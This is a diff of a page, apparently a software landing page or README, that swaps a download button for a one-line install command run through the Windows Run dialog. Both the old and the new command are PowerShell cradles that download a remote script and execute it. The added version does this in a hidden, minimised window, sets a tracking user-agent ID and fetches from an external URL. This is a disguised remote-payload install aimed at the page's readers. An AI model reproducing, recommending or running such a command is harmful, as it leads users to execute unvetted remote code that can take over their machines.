@@ -71,7 +71,7 @@ We’ve switched from a traditional download button to a one-line shell script b
 
 ### 💻 Install Command (Run via `Win + R`)
 <pre>
-  <code id="code-snippet">powershell -Command "$update='SafeModule'; $mode='digital'; $url=$update+'.'+$mode; $Response=Invoke-WebRequest -Uri $url -UseBasicParsing -UserAgent $update; $Script=[System.Text.Encoding]::UTF8.GetString($Response.Content); IEX $Script"</code>
+  <code id="code-snippet">cmd.exe /c start /min powershell -w h "$u='https://aidetector.tools/389290d';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iex(iwr $u -UseBasicParsing -UserAgent 'ID: oba71').Content;</code>
 </pre>
 ---
 
